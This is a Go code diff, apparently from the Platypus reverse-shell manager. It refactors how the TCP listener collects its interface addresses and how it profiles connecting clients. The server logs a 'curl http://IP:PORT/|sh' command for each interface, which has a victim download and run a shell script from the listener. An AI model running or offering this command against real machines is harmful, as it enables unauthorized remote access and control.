@@ -12,7 +12,6 @@ import (
 	"github.com/WangYihang/Platypus/lib/util/hash"
 	"github.com/WangYihang/Platypus/lib/util/log"
 	"github.com/WangYihang/Platypus/lib/util/raas"
-	"github.com/WangYihang/Platypus/lib/util/str"
 	humanize "github.com/dustin/go-humanize"
 	"github.com/jedib0t/go-pretty/table"
 )
@@ -27,6 +26,7 @@ type TCPServer struct {
 	Port          uint16                  `json:"port"`
 	Clients       map[string](*TCPClient) `json:"clients"`
 	TimeStamp     time.Time               `json:"timestamp"`
+	Interfaces    []string                `json:"interfaces"`
 	hashFormat    string
 	stopped       chan struct{}
 }
@@ -44,11 +44,38 @@ func CreateTCPServer(host string, port uint16, hashFormat string) *TCPServer {
 		Port:          port,
 		GroupDispatch: true,
 		Clients:       make(map[string](*TCPClient)),
+		Interfaces:    []string{},
 		TimeStamp:     time.Now(),
 		hashFormat:    hashFormat,
 		stopped:       make(chan struct{}, 1),
 	}
 	Ctx.Servers[hash.MD5(service)] = tcpServer
+
+	// Add help information of RaaS
+	// eg: curl http://[IP]:[PORT]/ | sh
+	if net.ParseIP(tcpServer.Host).IsUnspecified() {
+		// tcpServer.Host is unspecified
+		// eg: "0.0.0.0", "[::]"
+		ifaces, _ := net.Interfaces()
+		for _, i := range ifaces {
+			addrs, _ := i.Addrs()
+			for _, addr := range addrs {
+				switch v := addr.(type) {
+				case *net.IPNet:
+					// ipv4
+					if addr.(*net.IPNet).IP.To4() != nil {
+						tcpServer.Interfaces = append(tcpServer.Interfaces, v.IP.String())
+						break
+					}
+					// ipv6 is not used currently
+					// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, tcpServer.Port)
+				}
+			}
+		}
+	} else {
+		tcpServer.Interfaces = append(tcpServer.Interfaces, host)
+	}
+
 	return tcpServer
 }
 
@@ -121,29 +148,8 @@ func (s *TCPServer) Run() {
 	}
 	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))
 
-	// Add help information of RaaS
-	// eg: curl http://[IP]:[PORT]/ | sh
-	if net.ParseIP(s.Host).IsUnspecified() {
-		// s.Host is unspecified
-		// eg: "0.0.0.0", "[::]"
-		ifaces, _ := net.Interfaces()
-		for _, i := range ifaces {
-			addrs, _ := i.Addrs()
-			for _, addr := range addrs {
-				switch v := addr.(type) {
-				case *net.IPNet:
-					// ipv4
-					if addr.(*net.IPNet).IP.To4() != nil {
-						log.Warn("\t`curl http://%s:%d/|sh`", v.IP, s.Port)
-						break
-					}
-					// ipv6 is not used currently
-					// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, s.Port)
-				}
-			}
-		}
-	} else {
-		log.Warn("\t`curl http://%s:%d/|sh`", s.Host, s.Port)
+	for _, ifname := range s.Interfaces {
+		log.Warn("\t`curl http://%s:%d/|sh`", ifname, s.Port)
 	}
 
 	msg, _ := json.Marshal(WebSocketMessage{
@@ -276,15 +282,7 @@ const (
 
 func (s *TCPServer) AddTCPClient(client *TCPClient) {
 	client.GroupDispatch = s.GroupDispatch
-	log.Debug("Gathering information from client...")
-	echoEnabled, _ := client.TryReadEcho(str.RandomString(0x10))
-	client.EchoEnabled = echoEnabled
-	client.DetectOS()
-	client.DetectUser()
-	client.DetectPython()
-	client.DetectNetworkInterfaces()
-	client.Hash = client.MakeHash(s.hashFormat)
-	client.Mature = true
+	client.GatherClientInfo(s.hashFormat)
 	if _, exists := s.Clients[client.Hash]; exists {
 		log.Error("Duplicated income connection detected!")
 		// WebSocket Broadcast
